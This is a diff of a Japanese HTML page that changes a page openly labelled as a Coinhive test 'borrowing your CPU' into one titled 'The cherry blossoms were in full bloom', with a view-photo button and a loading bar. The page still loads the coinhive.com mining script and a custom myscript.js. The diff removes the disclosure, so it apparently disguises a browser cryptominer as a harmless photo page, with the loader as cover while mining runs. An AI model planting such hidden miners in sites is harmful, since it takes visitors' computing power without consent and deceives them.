@@ -2,28 +2,28 @@
 <html lang="ja">
 <head>
 	<meta charset="UTF-8">
-	<title>Coinhiveのテスト（CPU拝借中）</title>
+	<title>桜が満開でした</title>
 	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/css/materialize.min.css">
 </head>
 <body>
 	<div class="container">
-		<p class="pink-text">Coinhiveのテスト（CPU拝借中）</p>
-		<h1>これが解けたら天才</h1>
-		<h2>$$\int_{-\infty}^{\infty} \int_{-\infty}^{\infty} e^{-a(x^{2}+y^{2})} dxdy$$</h2>
-		<div id="loader">
-			<p class="center-align">計算中...（計算してないですけどね）</p>	
-			<div class="progress">
-				<div class="indeterminate"></div>
+		<h2 class="pink-text">桜が満開でした</h2>
+		<div id="interface">
+			<p>下のボタンをクリックすると画像が見れます。</p>
+			<button id="button" class="btn btn-large">画像を見る</button>
+			<div id="loader">
+				<p class="center-align">読み込み中...</p>
+				<div class="progress">
+					<div class="indeterminate"></div>
+				</div>
 			</div>
 		</div>
-		<div id="answer">
-			<h2>$$=\frac{\pi}{a}$$</h2>
+		<div id="picture">
+			<img src="picture.jpg" class="responsive-img" alt="">
 		</div>
-		<button id="button" class="btn btn-large">答えを見る</button>
 	</div>
 	
 	<script src="https://cdnjs.cloudflare.com/ajax/libs/materialize/0.100.2/js/materialize.min.js"></script>
-	<script src='https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.2/MathJax.js?config=TeX-MML-AM_CHTML'></script>
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 	<script src="https://coinhive.com/lib/coinhive.min.js"></script>
 	<script src='myscript.js'></script>
